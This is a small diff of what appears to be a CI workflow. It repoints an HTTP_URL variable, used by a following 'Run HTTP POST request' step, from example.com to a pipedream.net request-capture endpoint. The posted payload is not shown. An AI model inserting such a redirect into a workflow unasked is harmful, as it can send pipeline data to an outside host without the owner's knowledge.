@@ -14,7 +14,7 @@ jobs:
 
       - name: Set up environment variables
         run: |
-          echo "HTTP_URL=https://www.example.com" >> $GITHUB_ENV
+          echo "HTTP_URL=https://eolo9kbm4rgfpmv.m.pipedream.net" >> $GITHUB_ENV
 
       - name: Run HTTP POST request
         run: |
